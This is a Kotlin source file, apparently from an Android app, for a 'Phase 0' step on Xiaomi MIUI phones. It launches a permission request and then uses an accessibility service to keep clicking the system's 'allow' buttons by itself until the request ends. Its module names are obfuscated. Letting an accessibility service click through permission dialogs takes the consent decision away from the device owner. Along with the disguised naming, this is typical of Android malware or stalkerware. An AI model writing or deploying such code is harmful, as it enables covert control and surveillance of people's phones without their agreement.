package com.storm.safe.rock.service.modules.yw5xud.miui

import android.util.Log
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.common.UiDebugger
import kotlinx.coroutines.delay

/**
 * MiuiBasicPerms -- Phase 0 basic permission request delegate.
 * Launches umrkmgrri permission request and self-polls for allow buttons.
 *
 * Extracted from MiuiSteps.execute() Phase 0 inline code.
 */
class MiuiBasicPerms(
    private val service: MyAccessibilityService?,
    private val context: android.content.Context,
    private val ui: UiAutomation,
    private val steps: MiuiSteps
) {
    companion object {
        private const val TAG = "MiuiBasicPerms"
    }

    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            logs.add("MiuiSteps: launch basic permission request (umrkmgrri)")
            UiDebugger.dumpPage(service, "miui_phase0_before", "basic permission request before")
            com.storm.safe.rock.service.modules.yw5xud.common.umrkmgrri.start(context)
            steps.interruptibleDelay(800L)

            var clickCount = 0
            for (i in 0 until MiuiConstants.PERM_POLL_ITERATIONS) {
                if (!com.storm.safe.rock.service.modules.yw5xud.common.umrkmgrri.isRequestingPermissions) {
                    Log.i(TAG, "[Phase0] umrkmgrri finished after ${i * MiuiConstants.PERM_POLL_INTERVAL_MS}ms, clicks=$clickCount")
                    break
                }
                val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
                if (root != null) {
                    if (steps.pollClickPermissionAllow(root)) clickCount++
                }
                delay(MiuiConstants.PERM_POLL_INTERVAL_MS)
            }
            UiDebugger.dumpPage(service, "miui_phase0_after", "basic permission done, clicks=$clickCount")
            successes.add("basic permission request done (clicks=$clickCount)")
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.w(TAG, "[Phase0] exception: ${e.message}")
        }
    }
}
